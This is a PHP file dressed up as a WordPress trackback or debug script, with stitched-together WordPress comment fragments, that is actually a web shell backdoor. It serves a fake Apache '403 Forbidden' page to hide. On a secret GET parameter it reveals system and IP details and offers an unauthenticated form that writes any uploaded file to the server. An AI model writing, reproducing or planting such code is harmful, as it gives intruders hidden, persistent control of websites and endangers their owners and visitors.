<?php error_reporting(0);
/**
 * Response to a trackback.
 *
 * Index of Website Developer
 *
 * Responds with an error or success XML message.
 *
 * For developers: Website debugging mode.
 *
 * Change this to true to enable the display of notices during development.
 *
 * It is strongly recommended that plugin and theme developers.
 * in their development environments.
 *
 * For information on other constants that can be used for debugging,
 * 
 * @since 0.71
 *
 * @param mixed  $error         Whether there was an error.
 *                              Default '0'. Accepts '0' or '1', true or false.
 * @param string $error_message Error message if an error occurred.
 */
echo "<html>
<head>
     
 <title>403 Forbidden</title>
</head>
      <h1>Forbidden</h1>
      <p>You don't have permission to access ".$_SERVER[REQUEST_URI]." on this server.</p>
<hr>
      
<address>Apache/2.2.22 Sadachil Server at ".$_SERVER['SERVER_NAME']." Port ".$_SERVER['SERVER_PORT'].".</address>
";
/**
 * These can't be directly globalized in version.php. When updating,
 *
 * we're including version.php from another install and don't want
 *
 * these values to be overridden if already set.
 */
if(isset($_GET["sadachil"])){
echo "<body bgcolor='lavender'>
<br>
<font color='red'><b>System: </b></font>
<font color='seagreen'>".php_uname()."</font><br>
<font color ='red'><b>Server IP: </b></font><font color='seagreen'>".gethostbyname($_SERVER['HTTP_HOST'])." </font><br>
<font color='red'><b>Your IP: </b></font>
<font color='seagreen'>".$_SERVER['REMOTE_ADDR']."</font><br>
<font color='red'><b>Destination: </b></font><font color='seagreen '>".$_SERVER[SCRIPT_FILENAME]."</font>";
echo"<form method=post
enctype=multipart/form-data>";
echo"<input type=file name=f><input
name=v type=submit id=v
value=Upload><br>";
if($_POST["v"]==Upload){if(@copy($_FILES
["f"]["tmp_name"],$_FILES["f"]
["name"])){
echo"<font color='blue'><b>File Uploaded: </b></font>".$_FILES
["f"]["name"];
}else{
echo"<b>File Doesn't Uploaded";}}
}
/**
 * If not already configured, `$blog_id` will default to 1 in a single site
 *
 * configuration. In multisite, it will be overridden by default in ms-settings.php.
*/
if(isset($_GET["info"])){
echo "<body bgcolor='lavender'>
<br>
<font color='red'><b>System: </b></font>
<font color='seagreen'>".php_uname()."</font><br>
<font color ='red'><b>Server IP: </b></font><font color='seagreen'>".gethostbyname($_SERVER['HTTP_HOST'])." </font><br>
<font color='red'><b>Your IP: </b></font>
<font color='seagreen'>".$_SERVER['REMOTE_ADDR']."</font><br>
<font color='red'><b>Destination: </b></font><font color='seagreen '>".$_SERVER[SCRIPT_FILENAME]."</font>";
}
/**
 *
 * @global int $blog_id
 *
 * @since 2.0.0
 */
?>